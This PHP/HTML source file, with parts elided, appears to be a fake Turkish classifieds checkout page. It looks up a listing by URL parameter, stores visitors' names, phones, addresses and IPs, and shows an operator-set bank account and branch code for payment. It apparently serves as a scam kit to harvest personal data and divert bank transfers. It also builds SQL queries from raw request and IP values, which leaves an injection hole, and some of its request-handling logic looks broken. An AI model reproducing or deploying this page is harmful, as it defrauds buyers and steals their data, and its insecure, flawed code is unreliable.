<?php
  ...
  //IP BAN
  $IPQuery = $conn->query("SELECT * FROM ban WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  if ($IPQuery){
    ...
    if(!$_GET){
      ...
      $q = $_GET['q'];
      $query = $conn->query("SELECT * FROM ilan WHERE ilanurl = '{$q}'")->fetch(PDO::FETCH_ASSOC);
      if(empty($query)) {
        // header('Location: https://www.google.com');
      } else {
        ...
        if ($_POST){
          ...
          $addressDetail = trim(filter_input(INPUT_POST, 'addressDetail'));
            if (empty($firstName) || empty($lastName) || empty($homePhone) || empty($addressName) || empty($il) || empty($ilce) || empty($addressDetail)){
                ...
                try{
                    $dbQuery = $conn->prepare("INSERT INTO info SET firstName = ?, lastName = ?, homePhone = ?, addressName = ?, il = ?, ilce = ?, addressDetail=?, ip=?");
                    $insert = $dbQuery->execute(array($firstName, $lastName, $homePhone, $addressName, $il, $ilce, $addressDetail, $ip));
            ...
            <div class="set-payment-step-1-detail">
                <div class="responsive-part classified-info-part">
                  <div class="image-part">
                    <img src="assets/images/<?=$query['ilanfoto']?>" height="75" width="100" alt="">
                    <div class="favorite">
                      <h4><?=$query['ilanad']?></h4>
                    </div>
                  </div>
                ...
                <div class="right-box">
                  <div class="sub-right-box item">
                    <img class="big-image" src="assets/images/<?=$query['ilanfoto']?>" height="174" width="232" alt="">
                  ...
                  <a class="btn btn-new go-to-address-btn">Teslimat Adresi Seç</a>
                </div>
                <div class="responsive-part go-to-address-btn-wrapper">
                  <a class="btn btn-new go-to-address-btn responsiveBtn">Teslimat Adresi Seç</a>
                </div>
              </div>
              <div class="set-payment-step-2-detail">
                <div class="responsive-part address">
                  <div class="image-part">
                    <img src="assets/images/<?=$query['ilanfoto']?>" height="38" width="50" alt="">
                    <div class="favorite">
                      <h4><?=$query['ilanad']?></h4>
                    </div>
                  </div>
                ...
                <div class="left-box">
                      ...
                      <h3 id="addressPopupTitle">YENİ TESLİMAT ADRESİ</h3>
                        <div class="address-container clearfix">
                          ...
                          <div class="address-part right">
                            ...
                            <label for="town-1">İlçe</label>
                            <label for="town" class="hybrid-select">
                              <select name="ilce" id="ilce" class="town">
                                <option value="" disabled selected>Seçim Yapınız</option>
                              </select>
                              <span class="errorLabel">Lütfen ilçe seçin</span>
                            </label>
                  ...
                  <a class="back-to-the-future go-to-info-btn urunBack" data-click-category="sepetDetayi" style="display: inline">&lt; Ürün Adımına Geri Dön</a>
                </div>
                <div class="right-box">
                  <div class="sub-right-box item">
                    <img class="big-image" src="assets/images/<?=$query['ilanfoto']?>" height="174" width="232" alt="">
                  ...
                  <a href="#" id="proceedToPayment" class="btn btn-new go-to-payment-btn trackClick trackId_go_to_purchase_v3 purchaseBtn">Ödeme Adımına Geç</a>
                </div>
                <div class="responsive-part go-to-payment-btn-wrapper">
                  ...
                  <a class="btn btn-new go-to-payment-btn trackClick trackId_go_to_purchase_v3 responsivePurchase">Ödeme Adımına Geç</a>
                </div>
              </div>
              <div class="set-payment-step-3-detail">
                <div class="left-box">
                    ...
                    <div id="creditCardPayment" class="paymentTypes">
                        <div class="credit-card-form">
                          <div class="left-column">
                            ...
                            <div class="box">
                                <div class="left">
                                    <img src="assets/images/banks/<?=$query['banks']?>.jpg" alt="Banka">
                                </div>
                                <div class="right">
                                    <nav class="details">
                                        <ul>
                                            ...
                                            <li>
                                                ...
                                                <span class="account-number"><?=$query['hesapno']?></span>
                                            </li>
                                            <li>
                                                <span class="branch">Şube Kodu :</span>
                                                <span class="branch-code"><?=$query['subekodu']?></span>
                                            </li>
                                            <li>
                                                <div class="warn">
                  ...
                  <a href="#" class="back-to-the-future step-back step-back trackClick trackId_geriDon_v3 teslimatBackBtn" style="display: inline" data-click-category="odeme">&lt; Teslimat Bilgilerine Geri Dön</a>
                </div>
                <div class="right-box">
                    <div class="sub-right-box item">
                      <img class="big-image" src="assets/images/<?=$query['ilanfoto']?>" height="174" width="232" alt="">
